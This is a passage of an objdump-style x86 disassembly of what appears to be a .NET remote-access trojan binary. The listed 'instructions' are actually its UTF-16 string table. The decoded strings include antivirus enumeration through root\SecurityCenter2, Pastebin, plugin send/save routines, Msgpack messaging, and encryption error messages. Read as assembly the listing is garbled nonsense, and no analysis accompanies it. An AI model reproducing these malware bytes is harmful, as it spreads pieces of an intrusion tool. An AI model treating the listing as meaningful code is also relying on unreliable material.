  40c3e0:	00 73 00             	add    %dh,0x0(%ebx)
  40c3e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3e4:	00 66 00             	add    %ah,0x0(%esi)
  40c3e7:	74 00                	je     0x40c3e9
  40c3e9:	00 03                	add    %al,(%ebx)
  40c3eb:	20 00                	and    %al,(%eax)
  40c3ed:	00 09                	add    %cl,(%ecx)
  40c3ef:	54                   	push   %esp
  40c3f0:	00 72 00             	add    %dh,0x0(%edx)
  40c3f3:	75 00                	jne    0x40c3f5
  40c3f5:	65 00 00             	add    %al,%gs:(%eax)
  40c3f8:	0b 36                	or     (%esi),%esi
  40c3fa:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c3fd:	62 00                	bound  %eax,(%eax)
  40c3ff:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c405:	46                   	inc    %esi
  40c406:	00 61 00             	add    %ah,0x0(%ecx)
  40c409:	6c                   	insb   (%dx),%es:(%edi)
  40c40a:	00 73 00             	add    %dh,0x0(%ebx)
  40c40d:	65 00 00             	add    %al,%gs:(%eax)
  40c410:	0b 33                	or     (%ebx),%esi
  40c412:	00 32                	add    %dh,(%edx)
  40c414:	00 62 00             	add    %ah,0x0(%edx)
  40c417:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c41d:	50                   	push   %eax
  40c41e:	00 61 00             	add    %ah,0x0(%ecx)
  40c421:	74 00                	je     0x40c423
  40c423:	68 00 00 0f 56       	push   $0x560f0000
  40c428:	00 65 00             	add    %ah,0x0(%ebp)
  40c42b:	72 00                	jb     0x40c42d
  40c42d:	73 00                	jae    0x40c42f
  40c42f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c435:	00 0b                	add    %cl,(%ebx)
  40c437:	41                   	inc    %ecx
  40c438:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c43c:	00 69 00             	add    %ch,0x0(%ecx)
  40c43f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c440:	00 00                	add    %al,(%eax)
  40c442:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c446:	00 75 00             	add    %dh,0x0(%ebp)
  40c449:	65 00 00             	add    %al,%gs:(%eax)
  40c44c:	0b 66 00             	or     0x0(%esi),%esp
  40c44f:	61                   	popa
  40c450:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c454:	00 65 00             	add    %ah,0x0(%ebp)
  40c457:	00 17                	add    %dl,(%edi)
  40c459:	50                   	push   %eax
  40c45a:	00 65 00             	add    %ah,0x0(%ebp)
  40c45d:	72 00                	jb     0x40c45f
  40c45f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c463:	72 00                	jb     0x40c465
  40c465:	6d                   	insl   (%dx),%es:(%edi)
  40c466:	00 61 00             	add    %ah,0x0(%ecx)
  40c469:	6e                   	outsb  %ds:(%esi),(%dx)
  40c46a:	00 63 00             	add    %ah,0x0(%ebx)
  40c46d:	65 00 00             	add    %al,%gs:(%eax)
  40c470:	11 50 00             	adc    %edx,0x0(%eax)
  40c473:	61                   	popa
  40c474:	00 73 00             	add    %dh,0x0(%ebx)
  40c477:	74 00                	je     0x40c479
  40c479:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c47d:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c483:	41                   	inc    %ecx
  40c484:	00 6e 00             	add    %ch,0x0(%esi)
  40c487:	74 00                	je     0x40c489
  40c489:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c48f:	72 00                	jb     0x40c491
  40c491:	75 00                	jne    0x40c493
  40c493:	73 00                	jae    0x40c495
  40c495:	00 13                	add    %dl,(%ebx)
  40c497:	49                   	dec    %ecx
  40c498:	00 6e 00             	add    %ch,0x0(%esi)
  40c49b:	73 00                	jae    0x40c49d
  40c49d:	74 00                	je     0x40c49f
  40c49f:	61                   	popa
  40c4a0:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c4a4:	00 65 00             	add    %ah,0x0(%ebp)
  40c4a7:	64 00 00             	add    %al,%fs:(%eax)
  40c4aa:	09 50 00             	or     %edx,0x0(%eax)
  40c4ad:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4ae:	00 6e 00             	add    %ch,0x0(%esi)
  40c4b1:	67 00 00             	add    %al,(%bx,%si)
  40c4b4:	0b 47 00             	or     0x0(%edi),%eax
  40c4b7:	72 00                	jb     0x40c4b9
  40c4b9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4ba:	00 75 00             	add    %dh,0x0(%ebp)
  40c4bd:	70 00                	jo     0x40c4bf
  40c4bf:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c4c5:	00 2b                	add    %ch,(%ebx)
  40c4c7:	5c                   	pop    %esp
  40c4c8:	00 72 00             	add    %dh,0x0(%edx)
  40c4cb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4cc:	00 6f 00             	add    %ch,0x0(%edi)
  40c4cf:	74 00                	je     0x40c4d1
  40c4d1:	5c                   	pop    %esp
  40c4d2:	00 53 00             	add    %dl,0x0(%ebx)
  40c4d5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c4d9:	75 00                	jne    0x40c4db
  40c4db:	72 00                	jb     0x40c4dd
  40c4dd:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c4e3:	43                   	inc    %ebx
  40c4e4:	00 65 00             	add    %ah,0x0(%ebp)
  40c4e7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4e8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4ec:	00 72 00             	add    %dh,0x0(%edx)
  40c4ef:	32 00                	xor    (%eax),%al
  40c4f1:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c4f7:	6c                   	insb   (%dx),%es:(%edi)
  40c4f8:	00 65 00             	add    %ah,0x0(%ebp)
  40c4fb:	63 00                	arpl   %eax,(%eax)
  40c4fd:	74 00                	je     0x40c4ff
  40c4ff:	20 00                	and    %al,(%eax)
  40c501:	2a 00                	sub    (%eax),%al
  40c503:	20 00                	and    %al,(%eax)
  40c505:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c509:	6f                   	outsl  %ds:(%esi),(%dx)
  40c50a:	00 6d 00             	add    %ch,0x0(%ebp)
  40c50d:	20 00                	and    %al,(%eax)
  40c50f:	41                   	inc    %ecx
  40c510:	00 6e 00             	add    %ch,0x0(%esi)
  40c513:	74 00                	je     0x40c515
  40c515:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c51b:	72 00                	jb     0x40c51d
  40c51d:	75 00                	jne    0x40c51f
  40c51f:	73 00                	jae    0x40c521
  40c521:	50                   	push   %eax
  40c522:	00 72 00             	add    %dh,0x0(%edx)
  40c525:	6f                   	outsl  %ds:(%esi),(%dx)
  40c526:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c52a:	00 63 00             	add    %ah,0x0(%ebx)
  40c52d:	74 00                	je     0x40c52f
  40c52f:	00 17                	add    %dl,(%edi)
  40c531:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c535:	73 00                	jae    0x40c537
  40c537:	70 00                	jo     0x40c539
  40c539:	6c                   	insb   (%dx),%es:(%edi)
  40c53a:	00 61 00             	add    %ah,0x0(%ecx)
  40c53d:	79 00                	jns    0x40c53f
  40c53f:	4e                   	dec    %esi
  40c540:	00 61 00             	add    %ah,0x0(%ecx)
  40c543:	6d                   	insl   (%dx),%es:(%edi)
  40c544:	00 65 00             	add    %ah,0x0(%ebp)
  40c547:	00 07                	add    %al,(%edi)
  40c549:	4e                   	dec    %esi
  40c54a:	00 2f                	add    %ch,(%edi)
  40c54c:	00 41 00             	add    %al,0x0(%ecx)
  40c54f:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c555:	00 13                	add    %dl,(%ebx)
  40c557:	53                   	push   %ebx
  40c558:	00 6f 00             	add    %ch,0x0(%edi)
  40c55b:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c560:	00 61 00             	add    %ah,0x0(%ecx)
  40c563:	72 00                	jb     0x40c565
  40c565:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c56a:	09 70 00             	or     %esi,0x0(%eax)
  40c56d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c56e:	00 6e 00             	add    %ch,0x0(%esi)
  40c571:	67 00 00             	add    %al,(%bx,%si)
  40c574:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c579:	75 00                	jne    0x40c57b
  40c57b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c57f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c580:	00 00                	add    %al,(%eax)
  40c582:	15 73 00 61 00       	adc    $0x610073,%eax
  40c587:	76 00                	jbe    0x40c589
  40c589:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c58d:	6c                   	insb   (%dx),%es:(%edi)
  40c58e:	00 75 00             	add    %dh,0x0(%ebp)
  40c591:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c595:	6e                   	outsb  %ds:(%esi),(%dx)
  40c596:	00 00                	add    %al,(%eax)
  40c598:	07                   	pop    %es
  40c599:	44                   	inc    %esp
  40c59a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c59e:	00 00                	add    %al,(%eax)
  40c5a0:	15 73 00 65 00       	adc    $0x650073,%eax
  40c5a5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5a6:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c5aa:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5ae:	00 67 00             	add    %ah,0x0(%edi)
  40c5b1:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c5b7:	48                   	dec    %eax
  40c5b8:	00 61 00             	add    %ah,0x0(%ecx)
  40c5bb:	73 00                	jae    0x40c5bd
  40c5bd:	68 00 65 00 73       	push   $0x73006500
  40c5c2:	00 00                	add    %al,(%eax)
  40c5c4:	09 48 00             	or     %ecx,0x0(%eax)
  40c5c7:	61                   	popa
  40c5c8:	00 73 00             	add    %dh,0x0(%ebx)
  40c5cb:	68 00 00 1b 50       	push   $0x501b0000
  40c5d0:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5d4:	00 67 00             	add    %ah,0x0(%edi)
  40c5d7:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c5dd:	50                   	push   %eax
  40c5de:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5e2:	00 67 00             	add    %ah,0x0(%edi)
  40c5e5:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c5eb:	52                   	push   %edx
  40c5ec:	00 75 00             	add    %dh,0x0(%ebp)
  40c5ef:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5f0:	00 00                	add    %al,(%eax)
  40c5f2:	0f 4d 00             	cmovge (%eax),%eax
  40c5f5:	73 00                	jae    0x40c5f7
  40c5f7:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c5fb:	61                   	popa
  40c5fc:	00 63 00             	add    %ah,0x0(%ebx)
  40c5ff:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c602:	11 52 00             	adc    %edx,0x0(%edx)
  40c605:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c609:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c60d:	76 00                	jbe    0x40c60f
  40c60f:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c614:	0b 45 00             	or     0x0(%ebp),%eax
  40c617:	72 00                	jb     0x40c619
  40c619:	72 00                	jb     0x40c61b
  40c61b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c61c:	00 72 00             	add    %dh,0x0(%edx)
  40c61f:	00 47 6d             	add    %al,0x6d(%edi)
  40c622:	00 61 00             	add    %ah,0x0(%ecx)
  40c625:	73 00                	jae    0x40c627
  40c627:	74 00                	je     0x40c629
  40c629:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c62d:	4b                   	dec    %ebx
  40c62e:	00 65 00             	add    %ah,0x0(%ebp)
  40c631:	79 00                	jns    0x40c633
  40c633:	20 00                	and    %al,(%eax)
  40c635:	63 00                	arpl   %eax,(%eax)
  40c637:	61                   	popa
  40c638:	00 6e 00             	add    %ch,0x0(%esi)
  40c63b:	20 00                	and    %al,(%eax)
  40c63d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c63e:	00 6f 00             	add    %ch,0x0(%edi)
  40c641:	74 00                	je     0x40c643
  40c643:	20 00                	and    %al,(%eax)
  40c645:	62 00                	bound  %eax,(%eax)
  40c647:	65 00 20             	add    %ah,%gs:(%eax)
  40c64a:	00 6e 00             	add    %ch,0x0(%esi)
  40c64d:	75 00                	jne    0x40c64f
  40c64f:	6c                   	insb   (%dx),%es:(%edi)
  40c650:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c654:	00 6f 00             	add    %ch,0x0(%edi)
  40c657:	72 00                	jb     0x40c659
  40c659:	20 00                	and    %al,(%eax)
  40c65b:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c65f:	70 00                	jo     0x40c661
  40c661:	74 00                	je     0x40c663
  40c663:	79 00                	jns    0x40c665
  40c665:	2e 00 00             	add    %al,%cs:(%eax)
  40c668:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c66d:	70 00                	jo     0x40c66f
  40c66f:	75 00                	jne    0x40c671
  40c671:	74 00                	je     0x40c673
  40c673:	20 00                	and    %al,(%eax)
  40c675:	63 00                	arpl   %eax,(%eax)
  40c677:	61                   	popa
  40c678:	00 6e 00             	add    %ch,0x0(%esi)
  40c67b:	20 00                	and    %al,(%eax)
  40c67d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c67e:	00 6f 00             	add    %ch,0x0(%edi)
  40c681:	74 00                	je     0x40c683
  40c683:	20 00                	and    %al,(%eax)
  40c685:	62 00                	bound  %eax,(%eax)
  40c687:	65 00 20             	add    %ah,%gs:(%eax)
  40c68a:	00 6e 00             	add    %ch,0x0(%esi)
  40c68d:	75 00                	jne    0x40c68f
  40c68f:	6c                   	insb   (%dx),%es:(%edi)
  40c690:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c694:	00 00                	add    %al,(%eax)
  40c696:	55                   	push   %ebp
  40c697:	49                   	dec    %ecx
  40c698:	00 6e 00             	add    %ch,0x0(%esi)
  40c69b:	76 00                	jbe    0x40c69d
  40c69d:	61                   	popa
  40c69e:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c6a2:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c6a6:	00 6d 00             	add    %ch,0x0(%ebp)
  40c6a9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c6ad:	73 00                	jae    0x40c6af
  40c6af:	61                   	popa
  40c6b0:	00 67 00             	add    %ah,0x0(%edi)
  40c6b3:	65 00 20             	add    %ah,%gs:(%eax)
  40c6b6:	00 61 00             	add    %ah,0x0(%ecx)
  40c6b9:	75 00                	jne    0x40c6bb
  40c6bb:	74 00                	je     0x40c6bd
  40c6bd:	68 00 65 00 6e       	push   $0x6e006500
  40c6c2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6c6:	00 63 00             	add    %ah,0x0(%ebx)
  40c6c9:	61                   	popa
  40c6ca:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6ce:	00 6f 00             	add    %ch,0x0(%edi)
  40c6d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6d2:	00 20                	add    %ah,(%eax)
  40c6d4:	00 63 00             	add    %ah,0x0(%ebx)
  40c6d7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6d8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c6dc:	00 20                	add    %ah,(%eax)
  40c6de:	00 28                	add    %ch,(%eax)
  40c6e0:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6e3:	41                   	inc    %ecx
  40c6e4:	00 43 00             	add    %al,0x0(%ebx)
  40c6e7:	29 00                	sub    %eax,(%eax)
  40c6e9:	2e 00 00             	add    %al,%cs:(%eax)
  40c6ec:	05 58 00 32 00       	add    $0x320058,%eax
  40c6f1:	00 0f                	add    %cl,(%edi)
  40c6f3:	7b 00                	jnp    0x40c6f5
  40c6f5:	30 00                	xor    %al,(%eax)
  40c6f7:	3a 00                	cmp    (%eax),%al
  40c6f9:	44                   	inc    %esp
  40c6fa:	00 33                	add    %dh,(%ebx)
  40c6fc:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ff:	20 00                	and    %al,(%eax)
  40c701:	00 0f                	add    %cl,(%edi)
  40c703:	7b 00                	jnp    0x40c705
  40c705:	30 00                	xor    %al,(%eax)
  40c707:	3a 00                	cmp    (%eax),%al
  40c709:	58                   	pop    %eax
  40c70a:	00 32                	add    %dh,(%edx)
  40c70c:	00 7d 00             	add    %bh,0x0(%ebp)
  40c70f:	20 00                	and    %al,(%eax)
  40c711:	00 2b                	add    %ch,(%ebx)
  40c713:	28 00                	sub    %al,(%eax)
  40c715:	6e                   	outsb  %ds:(%esi),(%dx)
  40c716:	00 65 00             	add    %ah,0x0(%ebp)
  40c719:	76 00                	jbe    0x40c71b
  40c71b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c71f:	20 00                	and    %al,(%eax)
  40c721:	75 00                	jne    0x40c723
  40c723:	73 00                	jae    0x40c725
  40c725:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c72a:	00 20                	add    %ah,(%eax)
  40c72c:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c730:	00 70 00             	add    %dh,0x0(%eax)
  40c733:	65 00 20             	add    %ah,%gs:(%eax)
  40c736:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c739:	63 00                	arpl   %eax,(%eax)
  40c73b:	31 00                	xor    %eax,(%eax)
  40c73d:	00 45 28             	add    %al,0x28(%ebp)
  40c740:	00 65 00             	add    %ah,0x0(%ebp)
  40c743:	78 00                	js     0x40c745
  40c745:	74 00                	je     0x40c747
  40c747:	38 00                	cmp    %al,(%eax)
  40c749:	2c 00                	sub    $0x0,%al
  40c74b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c74f:	74 00                	je     0x40c751
  40c751:	31 00                	xor    %eax,(%eax)
  40c753:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c757:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c75b:	33 00                	xor    (%eax),%eax
  40c75d:	32 00                	xor    (%eax),%al
  40c75f:	29 00                	sub    %eax,(%eax)
  40c761:	20 00                	and    %al,(%eax)
  40c763:	74 00                	je     0x40c765
  40c765:	79 00                	jns    0x40c767
  40c767:	70 00                	jo     0x40c769
  40c769:	65 00 20             	add    %ah,%gs:(%eax)
  40c76c:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c76f:	63 00                	arpl   %eax,(%eax)
  40c771:	37                   	aaa
  40c772:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c775:	24 00                	and    $0x0,%al
  40c777:	63 00                	arpl   %eax,(%eax)
  40c779:	38 00                	cmp    %al,(%eax)
  40c77b:	2c 00                	sub    $0x0,%al
  40c77d:	24 00                	and    $0x0,%al
  40c77f:	63 00                	arpl   %eax,(%eax)
  40c781:	39 00                	cmp    %eax,(%eax)
  40c783:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c786:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c78a:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c78d:	24 f5                	and    $0xf5,%al
  40c78f:	ac                   	lods   %ds:(%esi),%al
  40c790:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c797:	7a 5c                	jp     0x40c7f5
  40c799:	56                   	push   %esi
  40c79a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c79d:	89 03                	mov    %eax,(%ebx)
  40c79f:	00 00                	add    %al,(%eax)
  40c7a1:	01 03                	add    %eax,(%ebx)
  40c7a3:	20 00                	and    %al,(%eax)
  40c7a5:	01 02                	add    %eax,(%edx)
  40c7a7:	06                   	push   %es
  40c7a8:	0e                   	push   %cs
  40c7a9:	03 06                	add    (%esi),%eax
  40c7ab:	12 09                	adc    (%ecx),%cl
  40c7ad:	03 06                	add    (%esi),%eax
  40c7af:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c7b3:	00 02                	add    %al,(%edx)
  40c7b5:	03 06                	add    (%esi),%eax
  40c7b7:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c7bd:	03 06                	add    (%esi),%eax
  40c7bf:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c7c4:	03 06                	add    (%esi),%eax
  40c7c6:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c7cc:	06                   	push   %es
  40c7cd:	1c 02                	sbb    $0x2,%al
  40c7cf:	06                   	push   %es
  40c7d0:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7d3:	00 12                	add    %dl,(%edx)
  40c7d5:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c7da:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c7e0:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c7e6:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c7e9:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c7ef:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c7f5:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7f8:	01 01                	add    %eax,(%ecx)
  40c7fa:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7fd:	00 12                	add    %dl,(%edx)
  40c7ff:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c804:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c80a:	02 03                	add    (%ebx),%al
  40c80c:	00 00                	add    %al,(%eax)
  40c80e:	1c 03                	sbb    $0x3,%al
  40c810:	00 00                	add    %al,(%eax)
  40c812:	08 04 00             	or     %al,(%eax,%eax,1)
  40c815:	01 01                	add    %eax,(%ecx)
  40c817:	08 04 00             	or     %al,(%eax,%eax,1)
  40c81a:	01 02                	add    %eax,(%edx)
  40c81c:	0e                   	push   %cs
  40c81d:	0a 00                	or     (%eax),%al
  40c81f:	04 02                	add    $0x2,%al
  40c821:	1c 12                	sbb    $0x12,%al
  40c823:	19 12                	sbb    %edx,(%edx)
  40c825:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c82a:	01 01                	add    %eax,(%ecx)
  40c82c:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c832:	1c 04                	sbb    $0x4,%al
  40c834:	08 00                	or     %al,(%eax)
  40c836:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c83c:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c83f:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c845:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c848:	00 12                	add    %dl,(%edx)
  40c84a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c84f:	03 08                	add    (%eax),%ecx
  40c851:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c854:	08 00                	or     %al,(%eax)
  40c856:	08 03                	or     %al,(%ebx)
  40c858:	00 00                	add    %al,(%eax)
  40c85a:	0e                   	push   %cs
  40c85b:	04 00                	add    $0x0,%al
  40c85d:	01 0e                	add    %ecx,(%esi)
  40c85f:	0e                   	push   %cs
  40c860:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c866:	d5 0a                	aad    $0xa
  40c868:	3a 06                	cmp    (%esi),%al
  40c86a:	00 01                	add    %al,(%ecx)
  40c86c:	12 29                	adc    (%ecx),%ch
  40c86e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c874:	03 00                	add    (%eax),%eax
  40c876:	00 18                	add    %bl,(%eax)
  40c878:	07                   	pop    %es
  40c879:	00 03                	add    %al,(%ebx)
  40c87b:	08 18                	or     %bl,(%eax)
  40c87d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c883:	18 0e                	sbb    %cl,(%esi)
  40c885:	06                   	push   %es
  40c886:	00 02                	add    %al,(%edx)
  40c888:	02 18                	add    (%eax),%bl
  40c88a:	10 02                	adc    %al,(%edx)
  40c88c:	06                   	push   %es
  40c88d:	00 01                	add    %al,(%ecx)
  40c88f:	11 30                	adc    %esi,(%eax)
  40c891:	11 30                	adc    %esi,(%eax)
  40c893:	06                   	push   %es
  40c894:	00 03                	add    %al,(%ebx)
  40c896:	01 09                	add    %ecx,(%ecx)
  40c898:	09 09                	or     %ecx,(%ecx)
  40c89a:	02 06                	add    (%esi),%al
  40c89c:	09 03                	or     %eax,(%ebx)
  40c89e:	06                   	push   %es
  40c89f:	11 30                	adc    %esi,(%eax)
  40c8a1:	04 00                	add    $0x0,%al
  40c8a3:	00 00                	add    %al,(%eax)
  40c8a5:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c8a9:	00 00                	add    %al,(%eax)
  40c8ab:	04 01                	add    $0x1,%al
  40c8ad:	00 00                	add    %al,(%eax)
  40c8af:	00 06                	add    %al,(%esi)
  40c8b1:	00 02                	add    %al,(%edx)
  40c8b3:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c8b6:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c8bb:	0e                   	push   %cs
  40c8bc:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c8c1:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c8c6:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8cb:	60                   	pusha
  40c8cc:	05 00 01 01 12       	add    $0x12010100,%eax
  40c8d1:	60                   	pusha
  40c8d2:	04 00                	add    $0x0,%al
  40c8d4:	01 01                	add    %eax,(%ecx)
  40c8d6:	0e                   	push   %cs
  40c8d7:	18 06                	sbb    %al,(%esi)
  40c8d9:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c8de:	12 49 0a             	adc    0xa(%ecx),%cl
  40c8e1:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c8e4:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c8ea:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c8ef:	0e                   	push   %cs
  40c8f0:	04 20                	add    $0x20,%al
  40c8f2:	00 00                	add    %al,(%eax)
  40c8f4:	00 04 40             	add    %al,(%eax,%eax,2)
  40c8f7:	00 00                	add    %al,(%eax)
  40c8f9:	00 04 10             	add    %al,(%eax,%edx,1)
  40c8fc:	00 00                	add    %al,(%eax)
  40c8fe:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c901:	01 01                	add    %eax,(%ecx)
  40c903:	0e                   	push   %cs
  40c904:	04 20                	add    $0x20,%al
  40c906:	01 0e                	add    %ecx,(%esi)
  40c908:	0e                   	push   %cs
  40c909:	06                   	push   %es
  40c90a:	20 01                	and    %al,(%ecx)
  40c90c:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c911:	20 02                	and    %al,(%edx)
  40c913:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c919:	00 01                	add    %al,(%ecx)
  40c91b:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c920:	06                   	push   %es
  40c921:	11 50 03             	adc    %edx,0x3(%eax)
  40c924:	06                   	push   %es
  40c925:	12 55 05             	adc    0x5(%ebp),%dl
  40c928:	00 01                	add    %al,(%ecx)
  40c92a:	0e                   	push   %cs
  40c92b:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c930:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c935:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c93b:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c941:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c947:	01 01                	add    %eax,(%ecx)
  40c949:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c94e:	60                   	pusha
  40c94f:	03 20                	add    (%eax),%esp
  40c951:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c954:	20 00                	and    %al,(%eax)
  40c956:	02 03                	add    (%ebx),%al
  40c958:	28 00                	sub    %al,(%eax)
  40c95a:	1c 03                	sbb    $0x3,%al
  40c95c:	06                   	push   %es
  40c95d:	12 60 0b             	adc    0xb(%eax),%ah
  40c960:	20 02                	and    %al,(%edx)
  40c962:	01 12                	add    %edx,(%edx)
  40c964:	60                   	pusha
  40c965:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c96a:	60                   	pusha
  40c96b:	04 20                	add    $0x20,%al
  40c96d:	00 12                	add    %dl,(%edx)
  40c96f:	60                   	pusha
  40c970:	05 20 01 12 60       	add    $0x60120120,%eax
  40c975:	0e                   	push   %cs
  40c976:	05 20 01 12 60       	add    $0x60120120,%eax
  40c97b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c981:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c986:	60                   	pusha
  40c987:	08 03                	or     %al,(%ebx)
  40c989:	20 00                	and    %al,(%eax)
  40c98b:	08 05 28 01 12 60    	or     %al,0x60120128
  40c991:	08 03                	or     %al,(%ebx)
  40c993:	28 00                	sub    %al,(%eax)
  40c995:	08 03                	or     %al,(%ebx)
  40c997:	06                   	push   %es
  40c998:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
